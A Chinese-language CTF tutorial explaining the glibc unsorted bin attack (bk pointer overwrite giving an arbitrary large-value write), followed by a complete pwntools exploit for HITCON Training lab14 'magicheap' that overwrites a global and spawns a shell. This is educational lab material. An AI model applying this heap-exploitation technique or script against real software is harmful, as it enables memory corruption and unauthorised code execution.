# Unsorted Bin Attack

## 概述

- 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针
- 可以达到的效果是实现修改任意地址值为一个较大的数值

## Unsorted bin

### 基本来源

- 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中
- 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中
- 当进行 malloc_consolidate 时，可能会把合并后的 chunk（不和top chunk相邻） 放到 unsorted bin 中

### 使用

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中

## 原理

当将一个 unsorted bin 取出的时候，会将 bck->fd 的位置写入本 Unsorted Bin 的位置

```c++
    /* remove from unsorted list */
    if (__glibc_unlikely (bck->fd != victim))
      malloc_printerr ("malloc(): corrupted unsorted chunks 3");
    unsorted_chunks (av)->bk = bck;
    bck->fd = unsorted_chunks (av);
```

所以，如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到任意地址

![Alt](img/unsorted_bin_attack_order.png)

**初始状态时** ：unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身
**free(p)** ：由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中
**修该`p[1]`** : 经过修改 unsorted bin 中的 p 的 bk 指针指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 处
**在申请 chunk** ： 假设所申请的 chunk 处于 small bin 所在的范围，但其对应的 bin 中暂时没有 chunk，所以会去 unsorted bin 中找，发现 unsorted bin 不空，于是把 unsorted bin 中的最后一个 chunk 拿出来

- victim = unsorted_chunks(av)->bk=p
- bck = victim->bk=p->bk = target addr-16
- unsorted_chunks(av)->bk = bck=target addr-16
- bck->fd = *(target addr -16+16) = unsorted_chunks(av);

在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。

unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大

## 实例-HITCON Training lab14 magic heap

### 基本功能-magic heap

1. 创建堆：根据用户指定大小申请相应堆，并且读入指定长度的内容，但是并没有设置 NULL。
2. 编辑堆：根据指定的索引判断对应堆是不是非空，如果非空，就根据用户读入的大小，来修改堆的内容，存在任意长度堆溢出的漏洞。
3. 删除堆：根据指定的索引判断对应堆是不是非空，如果非空，就将对应堆释放并置为 NULL。

此外，当选择功能时输入 4869，并且 magic 大于 4869时就可以调用l33t拿到shell

### 利用-magic heap

1. 释放一个堆块到 unsorted bin 中。
2. 利用堆溢出漏洞修改 unsorted bin 中对应堆块的 bk 指针为 &magic-16。
3. 触发漏洞

### exploit-magic heap

```python
from pwn import *
context.arch='amd64'
context.log_level="DEBUG"

p = process('./magicheap')

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

def create(size,content):
    ru("Your choice :")
    s(1)
    ru("Size of Heap : ")
    s(size)
    ru("Content of heap:")
    s(content)

def edit(index,size,content):
    ru("Your choice :")
    s(2)
    ru("Index :")
    s(index)
    ru("Size of Heap : ")
    s(size)
    ru("Content of heap : ")
    s(content)

def delete(index):
    ru("Your choice :")
    s(3)
    ru("Index :")
    s(index)

def l33t():
    ru("Your choice :")
    s(4869)
    itr()

def dbg():
    gdb.attach(p)
    pause()

create(0x20,'abcd') # id0
create(0x80,'abcd') # id1
create(0x80,'abcd') # id2, inorder to avoid id1 combine with top chunk when we free it

fake_chunk = 0x6020a0 - 0x10
delete(1)
# dbg()
# pwndbg> unsorted
# unsortedbin
# all: 0x11b6030 -> 0x7f679ac5cb78 (main_arena+88) <- 0x11b6030
# pwndbg> x/16g 0x11b6000
# 0x11b6000:    0x0000000000000000  0x0000000000000031
# 0x11b6010:    0x0000000064636261  0x0000000000000000
# 0x11b6020:    0x0000000000000000  0x0000000000000000
# 0x11b6030:    0x0000000000000000  0x0000000000000091
# 0x11b6040:    0x00007f679ac5cb78  0x00007f679ac5cb78
# 0x11b6050:    0x0000000000000000  0x0000000000000000
# 0x11b6060:    0x0000000000000000  0x0000000000000000
# 0x11b6070:    0x0000000000000000  0x0000000000000000
# pwndbg>

payload = p64(0)*5 + p64(0x91) + p64(0) + p64(fake_chunk)
edit(0,len(payload),payload)
# dbg()
# pwndbg> unsorted
# unsortedbin
# all [corrupted]
# FD: 0x714030 <- 0x0
# BK: 0x714030 -> 0x60208d <- 0x0
# pwndbg>

create(0x80,"dada")
# dbg()
# pwndbg> x/4g 0x1412030
# 0x1412030:    0x0000000000000000  0x0000000000000091
# 0x1412040:    0x0000000061646164  0x0000000000602090
# pwndbg> x/4g 0x0000000000602090
# 0x602090 <stdin@@GLIBC_2.2.5>:    0x00007f66fc3a18e0  0x0000000000000000
# 0x6020a0 <magic>: 0x00007f66fc3a1b78  0x0000000000000000
# pwndbg> x/x 0x00007f66fc3a1b78
# 0x7f66fc3a1b78 <main_arena+88>:   0x0000000001412150 <- maigc is bigger than 0x1305
# pwndbg>

l33t()
```
